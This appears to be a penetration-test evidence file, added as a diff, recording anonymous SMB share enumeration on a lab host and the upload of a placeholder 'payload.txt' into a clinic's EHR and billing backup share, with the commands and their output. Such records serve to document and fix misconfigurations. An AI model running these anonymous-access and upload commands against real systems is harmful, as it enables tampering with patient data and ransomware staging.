@@ -1,0 +1,20 @@
+# Evidence ID: E-003
+# Title: Unauthenticated SMB Share Enumeration & Ransomware Payload Drop Simulation
+# Collector: Chris Armata | Source: 10.0.2.25 | Target: 10.0.2.15 | UTC: 2026-11-16T14:12:19Z
+
+$ smbclient -L //10.0.2.15 -N
+Anonymous login successful
+
+    Sharename       Type      Comment
+    ---------       ----      -------
+    ClinicBackups   Disk      Comprehensive Neurology EHR & Billing Backup Repository
+    IPC$            IPC       IPC Service (ast02 server (Samba, Ubuntu))
+
+$ smbclient //10.0.2.15/ClinicBackups -N -c 'put /tmp/payload.txt payload.txt; ls'
+Anonymous login successful
+putting file /tmp/payload.txt as \payload.txt (142.6 kb/s) (average 142.6 kb/s)
+  .                                   D        0  Mon Nov 16 14:12:25 2026
+  ..                                  D        0  Mon Nov 16 14:02:10 2026
+  ehr_neuro_daily_20261116.bak        A 18432000  Mon Nov 16 02:00:04 2026
+  billing_claims_q4.tar.gz            A  4194304  Mon Nov 16 02:01:18 2026
+  payload.txt                         A      261  Mon Nov 16 14:12:25 2026
